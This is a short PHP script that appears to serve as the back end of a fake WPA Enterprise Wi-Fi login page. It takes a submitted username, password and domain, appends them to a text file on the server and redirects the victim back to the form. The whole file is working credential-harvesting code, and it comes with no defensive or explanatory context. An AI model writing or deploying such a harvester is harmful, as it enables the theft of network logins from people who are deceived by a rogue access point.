<?php
	$name = $_POST['usr-phi'];
	$passwd = $_POST['passwd-phi'];
	$domain = $_POST['domain-phi'];
	$my_file = 'credentials.txt';
	$handle = fopen("/var/www/WPAEnterprise/formdata.txt", "a") or die('Cannot open file:  '.$my_file);
	fwrite($handle, "============================>>>>>>\n");
	fwrite($handle, date("m/d/y") . "\n");
	fwrite($handle, "USR: $name\n");
	fwrite($handle, "PASSWD: $passwd\n");
	fwrite($handle, "DOMAIN: $domain\n");
	header('location:index.html');


    // Write out the credentials

    // Below onlt remmed for this document
    //$fp = fopen("/var/www/javawpa1access/formdata.txt", "a");
    //fwrite($fp, $accinfo);
    //fclose($fp);